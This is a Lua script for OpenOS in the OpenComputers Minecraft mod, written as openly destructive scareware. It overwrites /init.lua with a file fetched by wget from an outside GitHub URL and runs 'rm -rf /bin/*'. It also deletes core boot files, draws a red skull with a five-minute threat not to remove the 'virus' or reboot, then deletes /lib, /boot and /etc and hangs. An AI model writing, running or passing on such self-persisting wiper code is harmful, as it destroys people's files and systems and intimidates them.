local c = require("component")
local gpu = c.gpu
local comp = require("computer")
local fs = require("filesystem")
local os = require("os")
local shell = require("shell")
local event = require("event")

fs.remove("/init.lua")
os.execute("wget https://raw.githubusercontent.com/matvey-mayner/OpenOS-Apps/refs/heads/main/kraka/init.lua /init.lua")
shell.execute("rm -rf /bin/*")
fs.remove("/lib/core/boot.lua")
fs.remove("/boot/00_base.lua")

gpu.setResolution(80, 25)
gpu.setBackground(0xff0000)
gpu.setForeground(0xFFFFFF)

gpu.set(1, 1, "█████████████▀▀▀▀▀▀▀▀█████████████")
os.sleep(0.3)
gpu.set(1, 2, "████████████░░░░░░░░░░████████████")
os.sleep(0.3)
gpu.set(1, 3, "███████████░░░░░░░░░░░░███████████")
os.sleep(0.3)
gpu.set(1, 4, "███████████░░▄▄█░░█▄▄░░███████████")
os.sleep(0.3)
gpu.set(1, 5, "███████████▄░▀▀░▄▄░▀▀░▄███████████")
os.sleep(0.3)
gpu.set(1, 6, "█████████████░░░▀▀░░░█████████████")
os.sleep(0.3)
gpu.set(1, 7, "█████████████░░░██░░░█████████████")
os.sleep(0.3)
gpu.set(1, 8, "██████████████▄▄░░▄▄██████████████")
os.sleep(0.3)
gpu.set(1, 9, "██████████████████████████████████")
os.sleep(0.3)
gpu.set(1, 10, "█████▀▀▀▀▀▀▀▀▀██▄▄██▀▀▀▀▀▀▀▀▀█████")
os.sleep(0.3)
gpu.set(1, 11, "████▀█▄▄▄▄▄▄▄▄▄░██░▄▄▄▄▄▄▄▄▄█▀████")
os.sleep(0.3)
gpu.set(1, 12, "███░░░░█████████░░█████████░░░░███")

os.sleep(0.5)

gpu.set(10, 1, "You Have a 5 minutes")
os.sleep(0.3)
gpu.set(10, 3, "After five minutes, all your files will be deleted!")
os.sleep(0.3)
gpu.set(10, 6, "Rules:")
os.sleep(0.3)
gpu.set(10, 8, "1. Don't try delete this virus")
os.sleep(0.3)
gpu.set(10, 10, "2. Don't Reboot Computer")
os.sleep(0.3)
gpu.set(10, 12, "3. Don't leave this program")

os.sleep(300)

fs.remove("/lib/*")
fs.remove("/boot/*")
fs.remove("/etc/*")

while true do
    event.pull("touch")
end